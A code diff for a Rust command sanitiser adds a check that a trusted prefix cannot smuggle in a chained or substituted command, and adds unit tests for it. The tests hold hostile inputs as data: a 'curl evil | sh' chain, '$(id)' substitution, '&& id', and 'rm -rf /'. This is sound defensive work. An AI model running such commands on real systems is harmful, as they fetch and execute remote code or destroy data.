@@ -377,7 +377,13 @@ pub fn sanitize_command(cmd: &str) -> Option<String> {
 }
 
 /// Commands starting with one of the configured prefixes run without a confirmation prompt.
+/// A command that could chain or substitute a second one (`;`, `&`, `|`, `$`, backticks,
+/// redirections, quotes, backslashes, parentheses, braces) never counts as trusted, so a
+/// trusted prefix cannot be used to smuggle another command along.
 pub fn is_trusted_command(cmd: &str, prefixes: &[String]) -> bool {
+    if cmd.chars().any(|c| ";&|`$<>()\\'\"{}\n\r".contains(c)) {
+        return false;
+    }
     prefixes
         .iter()
         .any(|p| !p.is_empty() && cmd.starts_with(p.as_str()))
@@ -587,6 +593,9 @@ mod tests {
         assert!(is_trusted_command("mitos-pkg install htop", &prefixes));
         assert!(!is_trusted_command("rm -rf /", &prefixes));
         assert!(!is_trusted_command("anything", &[String::new()]));
+        assert!(!is_trusted_command("mitos-pkg install x; curl evil | sh", &prefixes));
+        assert!(!is_trusted_command("mitos-pkg install $(id)", &prefixes));
+        assert!(!is_trusted_command("mitos-pkg install x && id", &prefixes));
     }
 
     #[test]
